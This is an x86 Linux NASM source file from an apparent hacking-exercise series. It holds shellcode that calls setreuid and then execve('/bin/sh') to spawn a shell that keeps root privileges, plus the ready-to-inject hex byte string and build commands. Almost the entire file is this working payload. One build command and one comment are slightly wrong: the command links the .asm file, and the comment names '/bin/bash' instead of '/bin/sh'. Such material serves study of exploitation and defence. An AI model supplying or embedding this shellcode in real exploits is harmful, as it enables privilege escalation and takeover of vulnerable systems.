;    _________________
;  //                 \\
; || HOW TO COMPILE IT ||
;  \\_________________//
;
; -------- x86 ---------
; nasm -f elf getprivs.asm
; ld -s -o getprivs.elf getprivs.asm
;
; ----- Always x86 -----
; nasm -f elf getprivs.asm
; ld -m elf_i386 -s -o getprivs.elf getprivs.o
;
;    _________________
;  //                 \\
; ||   DUMP HEX CODE   ||
;  \\_________________//
;
; ------ ObjDump ------
; objdump -d ./getprivs.elf
;
;    _________________
;  //                 \\
; ||    DESCRIPTION    ||
;  \\_________________//
;
;      Spawn a shell
;     with root privs
;
; [!] If you run it, you will
;   get a Segmentation Fault
;
; LEVEL:    03
; ASM:      NASM
; ENVS:     Linux (Hacking)
; AUTHOR:   CosasDePuma
; DATE:     August, 28th 2017
;
;    _________________
;  //                 \\
; ||     SHELLCODE    ||
;  \\_________________//
;
; "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59"

[BITS 32]

[SECTION .text]
global _start

_start:
    ; clean the regs
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx

    ; setreuid function
    ; see 'man setreuid'
    ; setreuid is sys_call 70
    mov al, 70
    int 0x80
    jmp short _ender

_execve:
    ; execve function
    ; execute a program
    xor eax, eax
    ; get the name of the program
    pop ebx
    ; put a NULL where the N is in the string
    mov [ebx+7 ], al
    ; put the address of the string in XXXX
    mov [ebx+8 ], ebx
    ; put four NULLs in YYYY position
    mov [ebx+12], eax
    ; Now the string is like: "/bin/bash\0(*ebx)(*0000)"
    ; execve is sys_call 11
    mov al, 11
    ; put the XXXX and YYYY addresses into ecx and edx
    lea ecx, [ebx+8]
    lea edx, [ebx+12]
    int 0x80

_ender:
    ; see stackmsg.asm
    ; the same variables trick
    call _execve
    db '/bin/shNXXXXYYYY'
